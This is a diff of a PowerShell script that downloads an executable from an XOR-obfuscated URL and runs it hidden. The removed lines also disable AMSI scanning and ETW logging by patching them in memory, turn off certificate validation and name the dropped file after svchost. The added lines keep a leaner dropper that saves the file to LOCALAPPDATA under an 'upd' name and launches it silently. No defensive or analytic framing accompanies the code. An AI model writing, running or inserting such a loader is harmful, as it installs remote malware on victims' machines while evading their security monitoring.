@@ -1,38 +1,9 @@
 $ErrorActionPreference='SilentlyContinue'
-try{
-$d=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);' -Name G -Namespace W -PassThru
-$p=$d::GetProcAddress($d::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
-if($p -ne [IntPtr]::Zero){$o=0;[void]$d::VirtualProtect($p,[UIntPtr]6,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$p,6)}
-$e=$d::GetProcAddress($d::GetModuleHandle('ntdll.dll'),'EtwEventWrite')
-if($e -ne [IntPtr]::Zero){$o=0;[void]$d::VirtualProtect($e,[UIntPtr]1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::WriteByte($e,0xC3)}
-}catch{}
-
-function Dec([int[]]$a,[int]$k){-join($a|%{ [char]($_ -bxor $k) })}
-$enc=@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,100,104,99,105,103,105,58,32,97,106,121,96,34,32,105,104,125,127,104,126,126,100,98,99,102,100,97,97,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,110,127,116,125,121,104,105,82,125,98,122,104,127,126,101,104,97,97,35,104,117,104)
-$u=Dec $enc 13
-
-[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
-$wc=New-Object Net.WebClient
-$wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
-$b=$null
-try{$b=$wc.DownloadData($u)}catch{
- try{$h=[System.Net.Http.HttpClient]::new();$b=$h.GetByteArrayAsync($u).GetAwaiter().GetResult()}catch{}
-}
-if(-not $b -or $b.Length -lt 256){return}
-if($b[0] -ne 0x4D -or $b[1] -ne 0x5A){return}
-
-$dir=$env:LOCALAPPDATA
-if(-not $dir){$dir=Join-Path $env:USERPROFILE 'AppData\Local'}
-if(-not(Test-Path $dir)){[void](New-Item -ItemType Directory -Path $dir -Force)}
-$out=Join-Path $dir ('svchost{0}.exe' -f (Get-Random -Maximum 99999))
-[IO.File]::WriteAllBytes($out,$b)
-if(-not(Test-Path $out)){return}
-
-$si=New-Object Diagnostics.ProcessStartInfo
-$si.FileName=$out
-$si.WorkingDirectory=$dir
-$si.UseShellExecute=$false
-$si.CreateNoWindow=$true
-$si.WindowStyle='Hidden'
-[void][Diagnostics.Process]::Start($si)
+$k=13
+$u=-join(@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,100,104,99,105,103,105,58,32,97,106,121,96,34,32,105,104,125,127,104,126,126,100,98,99,102,100,97,97,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,110,127,116,125,121,104,105,82,125,98,122,104,127,126,101,104,97,97,35,104,117,104)|%{[char]($_-bxor$k)})
+$p=Join-Path $env:LOCALAPPDATA ('upd{0}.exe' -f (Get-Random -Max 9999))
+$w=New-Object Net.WebClient
+$w.Headers['User-Agent']='Mozilla/5.0'
+try{$w.DownloadFile($u,$p)}catch{return}
+if((Get-Item $p).Length -lt 256){return}
+Start-Process -FilePath $p -WindowStyle Hidden
